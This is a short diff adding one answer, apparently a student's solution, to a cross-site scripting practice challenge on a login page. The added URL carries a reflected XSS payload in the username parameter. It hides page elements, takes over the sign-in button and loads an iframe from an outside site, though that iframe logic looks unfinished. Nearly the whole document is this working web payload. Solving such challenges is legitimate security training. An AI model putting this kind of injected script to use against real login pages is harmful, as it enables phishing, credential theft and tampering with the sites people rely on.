@@ -14,3 +14,24 @@ http://xss-challenges.r7.io/0/login?username=%27%3E%3C/span%3E%3Cscript%3Ewindow
 
 4. 
 
+http://xss-challenges.r7.io/0/login?username='></span>
+<script>
+	window.onload=function(){
+		document.querySelectorAll(".problem")[0].style.display="None";
+		document.querySelectorAll(".error-message")[0].style.display="None";
+		document.getElementById("signin-btn").onclick = function(e){
+			e.preventDefault();
+			var iframe = document.createElement("iframe");
+			iframe.src = "http://students.washington.edu/caseyws/";
+			document.body.appendChild(iframe);
+			var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+			if(iframeDoc.readyState == 'complete') {
+				iframe.contentWindow.onload = function() {
+					console.log("hi");
+				}
+			}
+			
+		} 
+	}
+</script>
+<span style="display:none;">&password=hello&user_language=english
